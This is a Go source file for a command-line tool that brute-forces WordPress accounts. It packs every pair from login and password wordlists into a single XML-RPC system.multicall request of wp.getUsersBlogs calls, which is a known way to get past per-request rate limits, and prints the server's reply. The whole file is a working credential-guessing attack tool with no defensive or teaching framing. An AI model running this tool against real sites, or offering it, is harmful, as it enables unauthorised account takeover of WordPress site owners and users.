package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"text/template"
)

type Credentials struct {
	Login    string
	Password string
}

func main() {
	uFlag := flag.String("u", "", "Wordpress XMLRPC url")
	lFlag := flag.String("l", "", "Login")
	LFlag := flag.String("L", "", "Login wordlist")
	pFlag := flag.String("p", "", "Password")
	PFlag := flag.String("P", "", "Password wordlist")

	flag.Parse()

	if *uFlag == "" {
		log.Fatal("URL -u have to be provided")
	}
	if *lFlag == "" && *LFlag == "" {
		log.Fatal("login -l(for single) -L(for file) have to be provided")
	}
	if *pFlag == "" && *PFlag == "" {
		log.Fatal("login -p(for single) -P(for file) have to be provided")
	}

	var logins, passwords []string

	if *LFlag == "" {
		logins = append(logins, *lFlag)
	} else {
		data, err := ExtractDataFromFile(*LFlag)
		if err != nil {
			log.Fatal(err)
		}
		logins = data
	}

	if *PFlag == "" {
		passwords = append(passwords, *pFlag)
	} else {
		data, err := ExtractDataFromFile(*PFlag)
		if err != nil {
			log.Fatal(err)
		}
		passwords = data
	}

	credential_array, err := GenXMLCredentialLineArray(logins, passwords)
	if err != nil {
		log.Fatal(err)
	}

	payload := GenXMLPayload(credential_array)

	body, err := Request(*uFlag, payload)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Printf("%v\n", body)
}

func Request(url string, payload string) (string, error) {
	log.Printf("[o] Execute Request...\n")
	req, err := http.NewRequest("POST", url, bytes.NewBufferString(payload))
	if err != nil {
		return "", fmt.Errorf("Failed to create request: %w", err)
	}

	req.Header.Set("Content-Type", "application/xml")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("Failed to execute request: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("Failed to read response body: %w", err)
	}

	return string(body), nil
}

func GenXMLCredentialLine(login string, password string) (string, error) {
	template_string := "<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{{.Login}}</string></value><value><string>{{.Password}}</string></value></data></array></value></data></array></value></member></struct></value>"
	var buf bytes.Buffer

	credentials := Credentials{login, password}

	template, err := template.New("xml_temlate").Parse(template_string)
	if err != nil {
		return "", fmt.Errorf("Failed to parse xml template with %s:%s --- %w", login, password, err)
	}

	err = template.Execute(&buf, credentials)
	if err != nil {
		return "", fmt.Errorf("Failed to execute xml template with %s:%s --- %w", login, password, err)
	}

	return buf.String(), nil
}

func GenXMLPayload(credential_line []string) string {
	log.Printf("[o] Generating payloads...\n")
	payload_head := "<?xml version='1.0'?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"
	payload_tail := "</data></array></value></param></params></methodCall>"
	payload_body := ""
	for _, line := range credential_line {
		payload_body += line
	}

	return payload_head + payload_body + payload_tail
}

func GenXMLCredentialLineArray(logins []string, passwords []string) ([]string, error) {
	credential_line_array := []string{}
	for _, login := range logins {
		for _, password := range passwords {
			credential_line, err := GenXMLCredentialLine(login, password)
			if err != nil {
				return nil, err
			}
			credential_line_array = append(credential_line_array, credential_line)
			log.Printf("[o] Try with %s:%s", login, password)
		}
	}
	return credential_line_array, nil
}

func ExtractDataFromFile(path string) ([]string, error) {
	line_array := []string{}
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line_array = append(line_array, scanner.Text())
	}

	return line_array, nil
}
